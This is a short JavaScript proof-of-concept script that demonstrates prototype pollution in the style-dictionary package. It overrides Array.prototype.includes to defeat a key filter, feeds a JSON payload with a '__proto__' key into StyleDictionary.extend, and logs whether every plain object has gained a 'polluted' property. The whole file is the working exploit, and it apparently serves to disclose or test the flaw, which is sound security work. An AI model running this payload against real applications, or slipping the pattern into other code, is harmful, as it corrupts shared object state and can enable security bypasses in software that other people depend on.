Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const StyleDictionary = require('style-dictionary');
const obj = {};
let opts = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log({}.polluted);
StyleDictionary.extend(opts);
console.log({}.polluted);